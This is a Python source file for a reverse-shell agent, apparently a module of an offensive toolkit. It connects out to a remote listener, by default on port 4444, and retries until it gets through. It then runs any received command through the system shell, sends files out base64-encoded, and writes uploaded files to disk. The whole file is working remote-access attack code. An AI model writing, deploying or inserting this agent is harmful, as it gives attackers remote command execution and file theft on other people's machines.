#!/usr/bin/env python3
import base64
import json
import os
import socket
import subprocess
import sys
import time
from core.banner import info, success, warn, error

class AgentClient:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = None

    def connect(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                break
            except socket.error:
                time.sleep(5)

    def reliable_send(self, data):
        if isinstance(data, bytes):
            data = data.decode('utf-8', errors='ignore')
        json_data = json.dumps(data)
        if hasattr(json_data, 'encode'):
            json_data = json_data.encode('utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    return None
                json_data += chunk
                return json.loads(json_data.decode('utf-8'))
            except (ValueError, UnicodeDecodeError):
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8', errors='ignore')
        except subprocess.CalledProcessError as e:
            return e.output.decode('utf-8', errors='ignore') if e.output else str(e)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return f'[+] Working directory changed to: {os.getcwd()}'

    def read_file(self, path):
        with open(path, 'rb') as f:
            encoded = base64.b64encode(f.read())
            if hasattr(encoded, 'decode'):
                encoded = encoded.decode('utf-8')
            return encoded

    def write_file(self, path, content):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content))
        return f'[+] Successfully wrote uploaded file: {path}'

    def run(self):
        self.connect()
        while True:
            command = self.reliable_receive()
            if command is None:
                break
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit(0)
                elif command[0] == 'cd' and len(command) > 1:
                    result = self.change_working_directory_to(command[1])
                elif command[0] == 'download' and len(command) > 1:
                    result = self.read_file(command[1])
                elif command[0] == 'upload' and len(command) > 2:
                    result = self.write_file(command[1], command[2])
                else:
                    cmd_str = ' '.join(command) if isinstance(command, list) else str(command)
                    result = self.execute_system_command(cmd_str)
            except Exception as e:
                result = f'[-] Execution error on agent: {e}'
            self.reliable_send(result)

def run(args):
    ip = args.ip
    port = args.port or 4444
    if not ip:
        error('Remote listener IP (-i / --ip) is required.')
        return 1
    info(f'Connecting agent to listener at {ip}:{port}...')
    agent = AgentClient(ip, port)
    agent.run()
    return 0
